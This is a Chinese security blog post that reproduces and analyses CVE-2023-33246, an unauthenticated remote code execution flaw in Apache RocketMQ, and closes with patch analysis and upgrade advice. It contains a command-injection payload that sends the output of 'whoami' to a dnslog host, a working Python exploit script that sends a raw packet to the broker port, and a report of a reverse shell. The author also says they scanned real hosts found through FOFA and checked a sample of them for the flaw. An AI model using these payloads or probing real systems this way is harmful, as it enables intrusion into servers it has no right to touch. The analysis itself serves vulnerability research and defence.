<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0j-1FoMA2h4T8TFCxhOmTA)

  

**0x00 前言**

工作过程中有涉及到此漏洞，故抽空看了一下，于是有了这篇复现分析笔记。这个漏洞大概是五月下旬爆出的，前期并没有太多具体细节和利用工具。不过近日发现，该漏洞的 EXP 也被公开了一段时间了。

**0x01 漏洞描述**  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSduxPkfVFcrtmdicTgqz7cGnIpGicdQh24jb95t37CuT5OBXlicGicUvz9SA/640?wx_fmt=png)

Apache RocketMQ 远程代码执行漏洞（漏洞编号：CVE-2023-33246），公布时间为 2023-05-23，该漏洞会造成远程命令执行，攻击者可以直接获取到 RocketMQ 框架中节点主机的控制权限。经分析，漏洞成因主要为：

*   一是框架协议通信过程中未进行身份验证、协议内容明文传输；
    
*   二是框架后端调用敏感函数前未对参数进行安全检查；
    

**RocketMQ 整体架构图：**

RocketMQ 框架是阿里巴巴集团控股有限公司旗下的一款开源的高性能、高吞吐量的分布式消息中间件。后由阿里巴巴捐赠给 Apache 软件基金会，成为 Apache 的一个顶级项目 Apache RocketMQ，官网为 http://rocketmq.apache.org/。RocketMQ 框架由 Java 语言开发，尤其在电商领域提供了极高的并发支持和较广业务支撑，例如，可服务于互联网电商企业的注册、订单、库存、物流等业务，以及秒杀活动、周年庆、定期特惠等峰值时刻。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdpWsdmgCSqyeouCvmeWW7FuEo7LIrd2VUSmYVXW1FXMtJAm6wYbMrHg/640?wx_fmt=png)

核心部分包括：

*   NameServer 节点 / 集群：用于运维管理，如路由注册等。  
    
*   Broker 节点 / 集群：用户核心的消息订阅发送逻辑。  
    
*   Producer 是消息数据的产生方，向消息服务器发送消息；  
    
*   Consumer 是消息的接收处理方。  
    
*   Console 节点用于提供 Web 管理界面（可扩展选项）。
    

**0x02 漏洞利用条件**  

Apache RocketMQ 版本 < 5.1.1

**0x03 漏洞复现**  

**3.1 环境搭建**

本地复现环境配置：https://github.com/yizhimanpadewoniu/CVE-2023-33246-Copy

docker pull 镜像报错的解决方案：https://www.cnblogs.com/lvzhenjiang/p/14949722.html

```
# 启动namesrv
docker run -dit -p 9876:9876 -p 10909:10909 --name mqsrv -e "MAX_POSSIBLE_HEAP=100000000" apache/rocketmq:4.9.1 sh mqnamesrv /bin/bash
# 启动broker
docker run -dit -p 10908:10908 -p 10911:10911 --name mqbroker --restart=always --link mqsrv:namesrv -e "NAMESRV_ADDR=namesrv:9876" -e "MAX_POSSIBLE_HEAP=200000000" apache/rocketmq:4.9.1 sh mqbroker -c /home/rocketmq/rocketmq-4.9.1/conf/broker.conf
# 启动console
docker run -dit --name mqconsole -p 8080:8080 -e "JAVA_OPTS=-Drocketmq.config.namesrvAddr=mqsrv:9876 -Drocketmq.config.isVIPChannel=false" apacherocketmq/rocketmq-console:2.0.0

```

看到 console 的 web 界面就算搭建成功了

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSd66WtO8FwqGDXb8WdbjTUuhzayMq7ODSV3xenwH98iaS9q69q0JAzIQQ/640?wx_fmt=png)

**3.2 本地复现**

这里用 GitHub 上的开源 EXP：https://github.com/SuperZero/CVE-2023-33246

利用 DNS 外带，可以查看到命令执行的结果

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdHicYibxDG8eWkb2jgabx9ejzomUSiaQmuMlDqn1M4hibpk64detib3ibRxkA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSd13gaXlS7m8smv6hgBtYic5D9g6tTYLhocSj3XWZyY6LicQImo1mPNAtg/640?wx_fmt=png)

反弹 shell 成功，获得 broker 节点的控制权限

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdFfxXJDAAhUXibLqibJxyaf6AcF0TCJsmvRD2JfFyUvURkNxXSQQTg3Vg/640?wx_fmt=png)

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdtkTAMkoawN4bTftOIWnqG9pTxpPQicPQvlDLz9I8r01fXFLnIsSw4ug/640?wx_fmt=png)

**3.3 真实环境**

以 console 页面的 RocketMq-console-ng 作为指纹，fofa 上扫一波，随机抽样验证了漏洞存在。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSd1CIt2lRuDDAC0ENaY6vz5Hm4a26Ar7xoKicL5ibibYylFGDg1eEVyepicw/640?wx_fmt=png)

**0x04 漏洞成因分析**  

对 EXP 的攻击流量抓包分析，发现 EXP 与目标系统做了两次 TCP 交互。第一次交互是和 NameSever（9876 端口），第二次交互是和 Broker（10911 端口）

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdzBMhjS3GkmhECNgJBIeOjGVLdOg0ekP4VJa10MxUDqiaAhKrXlpFKZw/640?wx_fmt=png)

在第一次交互中，攻击者仿冒 Console 去访问 NameSever（9876 端口），然而通信前并没有进行身份验证，并且通信数据明文传输。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdxMBEw1sQecoOn3fxmiarlXOEb5KXXvicQibGsxAuNJvfChyuaZBUzvR6w/640?wx_fmt=png)

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdB45Bic7A8fn5jCBcU8GnJqZFjD7Ktic1dKo0JL1hzV8uibIWwMbwjTmyA/640?wx_fmt=png)

下载 RocketMQ 4.9.1 框架源码分析（https://archive.apache.org/dist/rocketmq/4.9.1/rocketmq-all-4.9.1-source-release.zip）  

搜索关键词 code，在 org.apache.rocketmq.common.protocol.RequestCode 中发现 code=105 的对应定义

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdhHNG6o0AKRGbr8tUFrWsvruia73N6tRGy2oCarPssaxb9Tw6wG5yROw/640?wx_fmt=png)

查看变量引用，定位到 getRouteInfoByTopic(ctx, request) 方法分析，第一次交互应该是获得注册 Broker 的路由信息（如 IP、端口等）和配置信息。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdXweT7RJklhFY2X4ibTBsPryhiccmFSLOFr02ICNxNlEGDiaUac3XiacmtQ/640?wx_fmt=png)

在第二次交互中，攻击者仿冒 NameServer 与 Broker 通信（10911 端口），依然没有进行身份验证和加密传输

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdoyKxeyAOianqsehEjltz43b2Yuz72Mn5mjxLfUQKbVDqRYLaJKvFvuQ/640?wx_fmt=png)

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdejvkwibRXpFBUChXhuX8vYMcNiabw1Pibx9enHK31RS0YjRE0rmwJFibLQ/640?wx_fmt=png)

可以看到这次交互的请求体中不仅包括了 json，还接了一段 body：

```
filterServerNums=1
rocketmqHome=-c $@|sh . echo curl http://`whoami`.7w10nq.dnslog.cn;

```

发现进行的是 code=25 的操作，作用应该是更新 Broker 的配置，查看引用，定位到 updateBrokerConfig(ctx, request) 方法

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdSszUkO23Pm5wHCusTyR4TiaFOekc8Gfd0tNg356I5u1hWThoJUAVPibA/640?wx_fmt=png)

跟进 org.apache.rocketmq.broker.processor.AdminBrokerProcessor#updateBrokerConfig，可以看到在更新配置属性之前，主要是字符串编码处理以及转化为转键值对属性，并未对输入进行安全检查。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdAHrUbnSA9B2BEW22MEt2eh1feQltzLiakjvKr7LuJlC6WovwbZxHiatw/640?wx_fmt=png)

继续跟进 update 方法可以看到，对所传入的待更新的配置属性，只检查属性名是否是 Broker 内置的，否则对于未知属性名进行不更新，没有进行其他安全检查。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSd3WU6r5ibsNa04g2m2KgTclTwicTsiblKBBCPt5PdN1mT3wfkMpnI7trHw/640?wx_fmt=png)

在 org.apache.rocketmq.common.BrokerConfig 中可以看到 Broker 内置的属性，攻击流量中协议的 body 部分就是对 filterServerNums 和 rocketmqHome 属性进行更新，通过更新配置属性 filterServerNums=1 启用了 filterServer 机制（默认 filterServerNums=0），**然后在配置属性 rocketmqHome 的更新值中拼接了系统命令。**

_基于类模式过滤是指在 Broker 端运行 1 个或多个消息过滤服务器（ FilterServer ),RocketMQ 允许消息消费者自定义消息过滤实现类并将其代码上传到 FilterServer 上，消息消费者向 FilterServer 拉取消息， FilterServer 将消息消费者的拉取命令转发到 Broker，然后对返回的消息执行消息过滤逻辑，最终将消息返回给消费端，相当于加了 FilterServer 作为中间人。_

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdicjhKLnPsw3Q65eaT7OoiczUDIKSb288psTcrh3IJlRYJRxF2Q9kPWfw/640?wx_fmt=png)

通过上述分析可知，RCE 的命令能够通过更新功能，成功写入到配置属性中，那么如何触发执行呢？  

既然 EXP 特意去启用了 RocketMQ 的 filterServer 机制，那么或许就是漏洞触发的条件，查看变量引用

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSd67lIWMfsNia7v7c1DJxTOYwMccMvibu9OzTLGpkzkIPHUNfEhZfibYybA/640?wx_fmt=png)

继续回溯 getFilterServerNums() 方法的调用，定位到 org.apache.rocketmq.broker.filtersrv.FilterServerManager#createFilterServer，这里看到 FilterServer 创建过程中会调用 FilterServerUtil.callShell() 执行命令。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdq7JcnvzrIpDdicx0yTCdXLtCZkWLXJ65nUMicRfcEywV2voQiayZXWnsw/640?wx_fmt=png)

跟进 FilterServerUtil.callShell()，发现它以空格为分隔符，将命令字符串分割成字符串数组，然后直接给到 Runtime.getRuntime().exec() 中去执行，那么我们如果能够控制传入的参数 shellstring，就能够 RCE

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdLObGZD0RnvFTibScdICUoCGQiaZgiaicy2pocayF6FxWJkDZWkVjM3kxAA/640?wx_fmt=png)

回到 createFilterServer 中，可以看到 cmd 是由 buildStartCommand() 初始化得到的，所以跟进该方法

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdQSowWV2uUTicQDqdJxFLj95VaibufM9XN8aVKovbIIcumUQKWrtKqIOg/640?wx_fmt=png)

这里对命令字符串进行了拼接，拼接的参数来自 Broker 的配置属性 RocketmqHome，而前面说过 Broker 的配置属性我们是可以任意控制的。因此，我们可以控制命令执行函数的输入从而造成 RCE。

那么怎么才能触发 createFilterServer 方法呢，查看调用，发现 start 方法，内部重载了 run 方法，每隔一段时间就执行一次

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdC0icZyJA3dZ3uibxej34Nsl4IgD7XCYbjtn2YGv7p6MgOBS1zyy8g5Rg/640?wx_fmt=png)

继续往上回溯调用，定位到 org.apache.rocketmq.broker.BrokerController#start

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdzpuOF6MkNT9GAWxeIZTpX9ysD08PibKKD2ImAnIMPAdAW7SX0xCBpGA/640?wx_fmt=png)

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdzdS8TcJJbsrXRZtzhxNfroPQ7zClK8JQ5ktSTPyibw0UoibGLZibbd1ZA/640?wx_fmt=png)

继续回溯，定位到 org.apache.rocketmq.broker.BrokerStartup#start，可以发现 Broker 只要启动运行，就会自动执行 start 方法，而 start 方法中如果检测到启动了 FilterServer 机制，则会自动触发 createFilterServer 方法。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSd5KQfRctlNDrz3WCicPqzwKmTujDo1gk8tvtngGNjEibWrxN7CZjk6c7Q/640?wx_fmt=png)

那么一切就顺理成章了，RCE 漏洞触发链为：

```
org.apache.rocketmq.broker.BrokerStartup#main
org.apache.rocketmq.broker.BrokerStartup#start
org.apache.rocketmq.broker.BrokerController#start
org.apache.rocketmq.broker.filtersrv.FilterServerManager#start
java.lang.Runnable#run
org.apache.rocketmq.broker.filtersrv.FilterServerManager#createFilterServer
org.apache.rocketmq.broker.filtersrv.FilterServerManager#buildStartCommand
org.apache.rocketmq.broker.filtersrv.FilterServerManager#createFilterServer
org.apache.rocketmq.broker.filtersrv.FilterServerUtil#callShell
java.lang.Runtime#exec(java.lang.String[])

```

我们再看一下 EXP 给的 jar 包，简单调试一下，看一下思路

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdIbey5PseMqUMZDwxLBUNVtNAu2EDZM1gicPX0bc9lBksGY8Oic5XiaKng/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdo7zhTNawBXK3WThhQPuvaRGKniapsMEcpxFqa93rzvmKKGhPMibhribew/640?wx_fmt=png)

主函数逻辑很简单，首先在 Broker 更新的配置属性中写入命令并启用 filterServer，然后实例化 DefaultMQAdminExt（RocketMQ 官方运维管理工具 mqadmin 的核心组件）与远端 RocketMQ 系统进行交互，过程中调用 updateBrokerConfig 方法去更新配置，最后等待下一次 createFilterServer 方法执行时就会触发漏洞。

但是这里最后拼接处的命令有点迷，我们进入容器查看 rocketmq 的 broker 日志，以之前打反弹 shell 的 payload 为例

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdkESwkowSo1b0O4ZJUHb6eDhyUACqzKdqFOicyVZZk61KFtEROrG69KQ/640?wx_fmt=png)

不是很明白为什么选择用 sh -c $@|sh . echo 开头？直接以 sh -c 也行吧，要执行的命令之间用 \ t 之类的做分隔符，这样就不会被 splitShellString 方法分割。例如：

```
import socket, binascii
client = socket.socket()
client.connect(('127.0.0.1', 10911))
json = '{"code":25,"extFields":{"test":"RockedtMQ"},"flag":0,"language":"JAVA","opaque":266,"serializeTypeCurrentRPC":"JSON","version":433}'.encode('utf-8')
body='filterServerNums=1\nnamesrvAddr=127.0.0.1:9876\nrocketmqHome=-c curl\thttp://xx.dnslog.cn #'.encode('utf-8')
json_lens = int(len(binascii.hexlify(json).decode('utf-8')) / 2)
part1 = '00000000' + str(hex(json_lens))[2:]
all_lens = int(4 + len(binascii.hexlify(body).decode('utf-8')) / 2 + json_lens)
part2 = '00000000' + str(hex(all_lens))[2:]
data = part2[-8:] + part1[-8:] + binascii.hexlify(json).decode('utf-8') + binascii.hexlify(body).decode('utf-8')
client.send(bytes.fromhex(data))
data_recv = client.recv(1024)
print(data_recv)

```

总之，漏洞成因主要是两点：

*   RocketMQ 框架中节点间的重要交互过程未进行身份验证，内容明文传输
    
*   RocketMQ 框架后端调用敏感函数前未对参数进行安全检查
    

另外，CVE-2023-33246 这个漏洞其实算是二合一，在官方的第一次补丁中 (https://github.com/apache/rocketmq/pull/6733/files#diff-fc0edd1ba06fb909a87fc13193e0b55eb5ad3a7eef4a524bb34f1496b2326a50)，可以发现 ban 了一些其他属性：

*   brokerConfigPath
    
*   configStorePath
    
*   kvConfigPath
    
*   configStorePathName
    

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdiaYTnD7e4Tib7TNNJKOyTpMDvB01vezAPsYQ3BTx937cGQxLa8KYzibbw/640?wx_fmt=png)

因为 CVE-2023-33246 这个漏洞中其实最开始是存在一个任意文件写入的利用链，也可以尝试写入 cron 来 RCE，但是利用起来相对麻烦，具体分析可以参考 lvyyevd 师傅的博客：http://www.lvyyevd.cn/archives/rocketmqrcecve-2023-33246-fen-xi，但个人认为不如上述通过 Runtime exec 来 RCE 的链子。

**0x05 漏洞修复**  

在官方的第二次补丁 (https://github.com/apache/rocketmq/pull/6749/files#diff-90b2c9df4cdd6dacc2cbccf461d3677f4fc0b83a209b055e9ad27729bffe646e) 中，直接移除了 filter server 的相关模块，也就是针对 Runtime exec 的链子的修复

![图片](https://mmbiz.qpic.cn/mmbiz_png/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdAB7Zic9tcicrOBSlgX1kX41A4PkkQCG1sAw2gPP85vZpu2k7QgXcerDg/640?wx_fmt=png)

修复建议直接升级 RocketMQ 框架：RocketMQ 5.* >= 5.1.1，RocketMQ 4.* >= 4.9.6。官方补丁下载地址：https://rocketmq.apache.org/download/

![图片](https://mmbiz.qpic.cn/mmbiz_gif/ezpQRXtYHibwFqqnAkpmeE2MOyib2ibLLSdcxfhmEic937ZAhe5aymywcniammBZ7cIU3mJpibzpNDECU3zFmNVDxeqw/640?wx_fmt=gif)

**参考文章**  

*   https://xz.aliyun.com/t/12589#toc-5
    
*   http://www.lvyyevd.cn/s/about/
    
*   https://blog.csdn.net/jdhellfire/article/details/131009358
    
*   https://github.com/SuperZero/CVE-2023-33246  
    

**Tips:**

  

  

****文章来源：****

****网络空间安全与法治协同创新中心****

往期精彩

工具获取回复 “burp”“awvs”“nessus”“ladon”"Forfity" 等可以。
------------------------------------------------

[快速攻击全自动化工具 JuD](http://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247490974&idx=1&sn=f0e36fcc93357677c4d303b38046d274&chksm=c0cbbc6af7bc357c08e75277b54fa6d5762b6857382e4aa36ae09cdd51e1efd93671e064e83e&scene=21#wechat_redirect)  

[Exp-Tools 1.1.3 版本发布](http://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247490540&idx=1&sn=d093f9fdd70016144c7ecc2a0e398998&chksm=c0cbba18f7bc330eb3c851bf16d4179dc19a0dbc4b618e57a1aa904fdd54fcb4f34147e745c3&scene=21#wechat_redirect)

[GUI-tools 渗透测试工具箱框架](http://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247489383&idx=1&sn=a4b39df6b12427d4ca71210d641e56f8&chksm=c0cbb693f7bc3f857bf67199adda6cb41a69ea83b156df3d405e2c4cc005a17e569e9fc6a7ff&scene=21#wechat_redirect)  

[阿波罗自动化攻击评估系统](http://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247488991&idx=1&sn=a700576606b86929e1397c6421467422&chksm=c0cbb42bf7bc3d3d32b642c6e12bab9e05ca509cbb09653abab9bee42e17f075f86fb6b8970f&scene=21#wechat_redirect)

 [微软 Word RCE 附 PoC](http://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247490056&idx=1&sn=ad97ade4235145cd4455d04c3f1e227a&chksm=c0cbbbfcf7bc32eaa8b94252c4d10811bda984fc99e5385984f939aaaff5f3911564dea07847&scene=21#wechat_redirect)  

[Clash 最新远程代码执行漏洞（附 POC）](http://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247490056&idx=1&sn=ad97ade4235145cd4455d04c3f1e227a&chksm=c0cbbbfcf7bc32eaa8b94252c4d10811bda984fc99e5385984f939aaaff5f3911564dea07847&scene=21#wechat_redirect)

[禅道系统权限绕过与命令执行漏洞（附 POC）](http://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247488575&idx=1&sn=6baf721c528c917bcd065d4e1214610c&chksm=c0cbb5cbf7bc3cddb477ebc085ee3eb8e8f64b254d1d2c593d855288047f80f60c2e77861361&scene=21#wechat_redirect)

[【附 EXP】CVE-2022-40684 & CVE-2022-22954](http://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247488069&idx=1&sn=bf43063812c1a7e7184cbedf954c6b44&chksm=c0cbb3b1f7bc3aa7adbb14ba5bd4ed9cff848da257369676c735d2ec2ef7145cdbce6bbfcbda&scene=21#wechat_redirect)

[](http://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247488069&idx=1&sn=bf43063812c1a7e7184cbedf954c6b44&chksm=c0cbb3b1f7bc3aa7adbb14ba5bd4ed9cff848da257369676c735d2ec2ef7145cdbce6bbfcbda&scene=21#wechat_redirect)[网络安全应急预案合集](http://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247489641&idx=1&sn=f354b9eedb00295b63a8ba94d0153d0b&chksm=c0cbb99df7bc308b391cfc57b7be6c45a16196ff4d5855c9ca6ea14ac7551fbbd8ad88462c8b&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC6hzicPF91rs9ItM18PtNACZP7sUrVePibyGR92ibmnNkSIkT0M5DWddcBmOCSoRyWiciaYIwMhtS0sY1g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

师傅们求点赞，求支持！